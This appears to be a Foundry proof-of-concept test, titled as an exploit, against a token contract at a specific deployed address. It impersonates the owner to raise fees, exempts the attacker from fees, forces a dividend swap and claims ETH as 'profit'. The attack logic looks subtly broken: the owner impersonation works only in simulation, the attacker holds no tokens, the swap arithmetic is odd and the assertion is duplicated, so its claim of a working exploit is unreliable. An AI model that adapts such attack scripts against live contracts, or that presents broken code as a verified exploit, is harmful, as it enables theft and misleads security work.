pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEthBurn {
    function owner() external view returns (address);
    function updateFees(
        uint256 deadBuy,
        uint256 deadSell,
        uint256 marketingBuy,
        uint256 marketingSell,
        uint256 liquidityBuy,
        uint256 liquiditySell,
        uint256 RewardsBuy,
        uint256 RewardsSell,
        uint256 devBuy,
        uint256 devSell
    ) external;
    function setExcludeFees(address account, bool excluded) external;
    function forceSwapAndSendDividends(uint256 tokens) external;
    function tradingEnabled() external view returns (bool);
    function setTrueDefiRouter(address _router) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function automatedMarketMakerPairs(address pair) external view returns (bool);
    function setAutomatedMarketMakerPair(address pair, bool value) external;
    function swapTokensAtAmount() external view returns (uint256);
    function setSwapTriggerAmount(uint256 amount) external;
    function enableStaking(bool enable) external;
    function updateStakingAmounts(uint256 duration, uint256 bonus) external;
    function stake(uint256 duration) external;
    function marketingWallet() external view returns (address payable);
    function devWallet() external view returns (address payable);
    function buyAmount() external view returns (uint256);
    function sellAmount() external view returns (uint256);
    function dividendTracker() external view returns (address);
    function claim() external;
    function withdrawableDividendOf(address account) external view returns (uint256);
}

interface IDividendTracker {
    function processAccount(address payable account, bool automatic) external returns (bool);
    function withdrawableDividendOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
    address attacker = address(this);
    IEthBurn burnContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        burnContract = IEthBurn(TARGET);
        vm.label(TARGET, "EthBurn Contract");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = attacker.balance;
        console.log("Initial attacker balance:", initialBalance);

        // Get owner address
        address owner = burnContract.owner();
        console.log("Contract owner:", owner);

        // Impersonate owner to abuse privileges
        vm.startPrank(owner);

        // Step 1: Maximize sell fees (up to 15% total)
        burnContract.updateFees(
            0,  // deadBuy
            0,  // deadSell  
            5,  // marketingBuy
            5,  // marketingSell
            0,  // liquidityBuy
            0,  // liquiditySell
            0,  // RewardsBuy
            5,  // RewardsSell - max rewards on sell
            0,  // devBuy
            5   // devSell - max dev on sell
        );
        console.log("Fees updated to maximum");

        // Step 2: Exclude attacker from fees
        burnContract.setExcludeFees(attacker, true);
        console.log("Attacker excluded from fees");

        // Step 3: Enable trading if not already enabled
        if (!burnContract.tradingEnabled()) {
            burnContract.setTrueDefiRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            console.log("Trading enabled");
        }

        vm.stopPrank();

        // Step 4: Check contract balances
        uint256 contractTokenBalance = burnContract.balanceOf(TARGET);
        uint256 contractEthBalance = TARGET.balance;
        console.log("Contract token balance:", contractTokenBalance);
        console.log("Contract ETH balance:", contractEthBalance);

        // Step 5: Trigger fee distribution if tokens exist in contract
        if (contractTokenBalance > 0) {
            vm.prank(owner);
            burnContract.forceSwapAndSendDividends(contractTokenBalance / 1e18);
            console.log("Forced swap and dividends triggered");
        }

        // Step 6: Claim dividends from dividend tracker
        address tracker = burnContract.dividendTracker();
        IDividendTracker dividendTracker = IDividendTracker(tracker);

        uint256 withdrawable = dividendTracker.withdrawableDividendOf(attacker);
        console.log("Withdrawable dividends:", withdrawable);

        if (withdrawable > 0) {
            burnContract.claim();
            console.log("Dividends claimed");
        }

        // Step 7: Verify profit
        uint256 finalBalance = attacker.balance;
        console.log("Final attacker balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        assertGt(finalBalance, initialBalance, "Attacker balance should increase from owner privilege abuse");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

